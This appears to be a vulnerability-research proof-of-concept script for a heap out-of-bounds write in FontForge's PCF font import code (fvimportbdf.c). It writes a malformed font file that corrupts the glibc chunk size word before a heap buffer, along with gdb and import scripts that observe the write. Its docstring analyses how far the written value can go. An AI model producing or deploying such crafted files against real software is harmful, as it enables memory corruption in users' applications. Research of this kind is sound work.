#!/usr/bin/env python3
"""Measure the write value at a LARGE loop index, not just i=0 (W12).

W10's VALUE-CEILING.md derived 0x0100FEFF from the special case
`min2=max2, min1=max1, tot=1, i=0` and called it a hard ceiling. It is not.
The pinned RHS at fvimportbdf.c:1751 is

  (i/(max2-min2+1) + min2)*256 + (i%(max2-min2+1) + min1)

With d = max2-min2+1 = 1 (min2=max2=0xffff), min1=0, max1=0xffff, tot=65536,
and the truncated (EOF=-1) glyph at i=65535, the RHS is

  (65535 + 65535)*256 + 0 = 0x01FFFE00

about twice W10's value. Byte 3 (bits 24..31) is still 0x01: the structural
conclusion (no arbitrary address byte, no mapped target) survives. The true
ceiling of the expression under the sequential-truncation field constraint is
0x01FFFE00, attained here.

The PCF carries min2=max2=0xffff, min1=0, max1=0xffff and 65535 complete
little-endian 0xffff glyph indices (all skipped by `glyph!=0xffff`); the 65536th
index is absent, so getformint16() returns EOF=-1 and the write lands at
encs[-1], the high half of encs' own glibc chunk size word.
"""
import pathlib
import struct

HERE = pathlib.Path(__file__).resolve().parent
BASE = bytearray((HERE / "truncated.pcf").read_bytes())

data = bytearray(BASE[:0x123])
struct.pack_into("<HHHH", data, 0x118, 0xFFFF, 0xFFFF, 0x0000, 0xFFFF)
data += b"\xff\xff" * 65535
(HERE / "value-ceiling-high.pcf").write_bytes(data)

(HERE / "import-value-ceiling-high.ff").write_text(
    "New()\n" f'Import("{HERE / "value-ceiling-high.pcf"}")\n'
)

(HERE / "gdb-value-ceiling-high.cmd").write_text(
    "set pagination off\n"
    "break fvimportbdf.c:1751 if glyph < 0\n"
    "run -script import-value-ceiling-high.ff\n"
    'printf "HIT glyph=%d i=%d encs=%p\\n", glyph, i, encs\n'
    'printf "fields min2=%d max2=%d min1=%d max1=%d tot=%d d=%d\\n", '
    "min2,max2,min1,max1,tot,max2-min2+1\n"
    "p/x (i/(max2-min2+1)+min2)*256+(i%(max2-min2+1)+min1)\n"
    "watch *(long*)((char*)encs-8)\n"
    "continue\n"
    "x/gx (char*)encs-8\n"
    "x/4xb (char*)encs-4\n"
    "bt 3\n"
    "quit\n"
)

print(f"value-ceiling-high.pcf: {len(data)} bytes, RHS at i=65535 = 0x01fffe00")
